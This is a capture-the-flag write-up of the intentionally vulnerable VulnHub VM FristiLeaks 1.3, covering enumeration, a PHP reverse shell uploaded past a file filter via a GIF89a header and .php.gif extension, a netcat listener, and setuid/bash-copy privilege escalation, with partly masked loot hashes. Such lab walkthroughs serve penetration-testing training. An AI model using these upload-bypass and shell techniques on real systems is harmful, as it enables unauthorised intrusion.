[VulnHub] FristiLeaks: 1.3
===============
date: 11/Sep/2019
summary: This is a writeup for VulnHub machine FristiLeaks: 1.3.
tags: vulnhub, writeup

## Overview
This is a writeup for VulnHub VM [FristiLeaks: 1.3](https://www.vulnhub.com/entry/fristileaks-13,133/). Here are stats for this machine from [machinescli](https://github.com/7h3rAm/machinescli):

![writeup.overview.machinescli](/static/files/posts_vulnhub_fristileaks1dot3/machinescli.png.webp)

### Killchain
Here's the killchain (`enumeration` → `exploitation` → `privilege escalation`) for this machine:

![writeup.overview.killchain](/static/files/posts_vulnhub_fristileaks1dot3/killchain.png.webp)

### TTPs
1\. `80/tcp/http/Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)`: [exploit_php_fileupload](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [exploit_php_fileupload_bypass](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [privesc_sudo](https://github.com/7h3rAm/writeups#privesc_sudo), [privesc_setuid](https://github.com/7h3rAm/writeups#privesc_setuid)  

## Phase #1: Enumeration
1\. Here's the Nmap scan result:  
```
# Nmap 7.70 scan initiated Wed Sep 11 13:59:40 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/vulnhub/fristileaks1.3/results/192.168.92.133/scans/_quick_tcp_nmap.txt -oX /root/toolbox/vulnhub/fristileaks1.3/results/192.168.92.133/scans/xml/_quick_tcp_nmap.xml 192.168.92.133
Nmap scan report for 192.168.92.133
Host is up, received arp-response (0.00099s latency).
Scanned at 2019-09-11 13:59:41 PDT for 13s
Not shown: 999 filtered ports
Reason: 992 no-responses and 7 host-prohibiteds
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 11 13:59:54 2019 -- 1 IP address (1 host up) scanned in 14.00 seconds
```

2\. Here a summary of open ports and associated [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan files:

![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_fristileaks1dot3/openports.png.webp)  

3\. We find references to 3 directories from `robots.txt`:  
```
http://192.168.92.133/cola
http://192.168.92.133/sisi
http://192.168.92.133/beer
```

![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot01.png.webp)  

4\. These directories don't have anything useful other than a meme image. Since all these directory names are references to drinks and the name of this VM also referes to one, we try `http://192.168.92.133/fristi` and are presented with a login page:  

![writeup.enumeration.steps.4.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot02.png.webp)  

### Findings
#### Open Ports
```
80/tcp  |  http  |  Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
```
#### Files
```
http://192.168.92.133/robots.txt
http://192.168.92.133/fristi
```
#### Users
```
ssh: eezeepz, admin, fristigod
```

## Phase #2: Exploitation
1\. The source of this page hints at a possible username `eezeepz` and password encoded within an image embedded as Base64 data in this source:  
```
eezeepz/keKkeKKeKKeKkEkkEk
```

![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot02a.png.webp)  

![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_fristileaks1dot3/screenshot02b.png.webp)  

2\. We login using these credentials and are presented with a file upload page. We create a PHP reverse shell, add `GIF89a` magic byte to it start and rename it as `rs.php.gif` to evade filters and upload the file. Once uploaded the applications informs us of the upload directory as well:  
```
rs.php.gif → http://192.168.92.133/fristi/uploads/rs.php.gif
```

![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot03.png.webp)  

3\. We start a Netcat listener, issue a request for this file using `curl` and are presented with the initial shell:  
```
nc -nlvp 443
curl -v "http://192.168.92.133/fristi/uploads/rs.php.gif"
```

![writeup.exploitation.steps.3.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot04.png.webp)  

![writeup.exploitation.steps.3.2](/static/files/posts_vulnhub_fristileaks1dot3/screenshot05.png.webp)  

## Phase #2.5: Post Exploitation
```
apache@localhost.localdomain> id
uid=48(apache) gid=48(apache) groups=48(apache)
apache@localhost.localdomain>  
apache@localhost.localdomain> uname
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
apache@localhost.localdomain>  
apache@localhost.localdomain> ifconfig
eth0  Link encap:Ethernet  HWaddr 08:00:27:A5:A6:76
      inet addr:192.168.92.133  Bcast:192.168.92.255  Mask:255.255.255.0
      inet6 addr: fe80::a00:27ff:fea5:a676/64 Scope:Link
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:343696 errors:0 dropped:0 overruns:0 frame:0
      TX packets:199868 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000
      RX bytes:28339698 (27.0 MiB)  TX bytes:30059387 (28.6 MiB)
apache@localhost.localdomain>  
apache@localhost.localdomain> users
eezeepz
admin
fristigod
```

## Phase #3: Privilege Escalation
1\. Exploring the filesystem, we come across `/var/www/notex.txt` file. This file hints looking at the contents of user `eezeepz`'s home directory:  
```
cd /var/www
cat notes.txt
```

![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot06.png.webp)  

2\. We find another interesting file at `/home/eezeepz/notes.txt` which hints at a possible privesc method:  
```
cd /home/eezeepz
cat notes.txt
```

![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot07.png.webp)  

3\. As suggested in the notes file, we create a file `/tmp/runthis` to execute a command starting with `/usr/bin` followed by directory traversal strings to copy the `bash` shell into `/tmp` directory and setuid on it. Since these commadns are executed within the scope of user `admin`, wehn we run the `/tmp/bash` file, we get a shell as user `admin`:  
```
echo -e "/usr/bin/../../bin/cp /bin/bash /tmp/bash; chmod u+s /tmp/bash" >/tmp/runthis
/tmp/bash -p
```

![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot07a.png.webp)  

4\. We move into `/home/admin` directory and find a reversed, Base64 encoded string within `whoisyourgodnow.txt` file, that is owned by user `fristigod`. We also find a Python script `cryptpass.py` in this directory. Looking at the script, we reverse the encoding process and add a decoding method to it. Testing updated script with `=RFn0AKnlMHMPIzpyuTI0ITG` reveals the password for user `fristigod` to be `LetThereBeFristi!`. We the use `su` to switch user:  
```
cat whoisyourgodnow.txt
cat cryptpass.py
python cryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
su - fristigod
```

![writeup.privesc.steps.4.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot07b.png.webp)  

![writeup.privesc.steps.4.2](/static/files/posts_vulnhub_fristileaks1dot3/screenshot07c.png.webp)  

5\. Looking at the file `cryptedpass.txt`, which is owned by user `admin`, we see a similar encoded string as before and repeat the process to get decoded the decoded password `thisisalsopw123`. We use this to switch user:  
```
cat cryptedpass.txt
cat cryptpass.py
python cryptpass.py mVGZ3O3omkJLmy2pcuTq
su - admin
```

![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot07d.png.webp)  

![writeup.privesc.steps.5.2](/static/files/posts_vulnhub_fristileaks1dot3/screenshot07e.png.webp)  

6\. We return to being user `fristigod` and explore their home directory. Within the `./bash_history` file we find references to a local, setuid file `.secret_admin_stuff/doCom`:  
```
cd /home/fristigod
cat .bash_history
```

![writeup.privesc.steps.6.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot07f.png.webp)  

![writeup.privesc.steps.6.2](/static/files/posts_vulnhub_fristileaks1dot3/screenshot07g.png.webp)  

7\. Using examples from `.bash_history`, we run the setuid file to execute `/bin/bash` and gain elevated privileges:  
```
sudo -u fristi ./doCom "/bin/bash"
```

![writeup.privesc.steps.7.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot08.png.webp)  

8\. We then explore `root`'s home directory and find the flag within `/root/fristileaks_secrets.txt` file:  
```
cd /root
cat fristileaks_secrets
```

![writeup.privesc.steps.8.1](/static/files/posts_vulnhub_fristileaks1dot3/screenshot09.png.webp)  

## Loot
### Hashes
```
root:$6$qAoeosiW$fsOy8H/VKux.9K0T3Ww2D3FPNlO5LAaFytx/6t69Q7LPDSS/nNiP4xzq0Qab.Iz3uy5fYdH3Aw/K5v3ZM........................
eezeepz:$6$djF4bN.s$JWhT7wJo37fgtuJ.be2Q62PnM/AogXuqGa.PgRzrMGv9/Th0aixBXl8Usy9.RkO1ZRAQ/UM3xP7oGWu9z........................
admin:$6$NPXhvENr$yG4a5RpaLpL5UDRRZ3Ts0eZadZfFFbYpI1kyNJp9rND0AySx2FhYSmAvY.91UzETJVvZcDjWb2pp85uLA........................
fristigod:$6$0WqnZlI/$gIzMByP7rH21W3neA.uHYZZg5aM7gI1xtOj8WwgoK1QgQh2LWL0nQBJau/mGcOSxLbaGJhJjM.6HNJTW.........................
```
### Credentials
```
ssh: admin/thisisalsop...., fristigod/LetThereBeF......
http: eezeepz/keKkeKKeKKeKk.....
```
### Flags
```
Y0u_kn0w_y0u_l0ve_f.....
```

## References
* <https://www.vulnhub.com/entry/fristileaks-13,133/>  
* <https://highon.coffee/blog/fristileaks-walkthrough/>  
* <https://kongwenbin.wordpress.com/2017/12/31/write-up-for-fristileaks-v1-3-vulnhub/>  
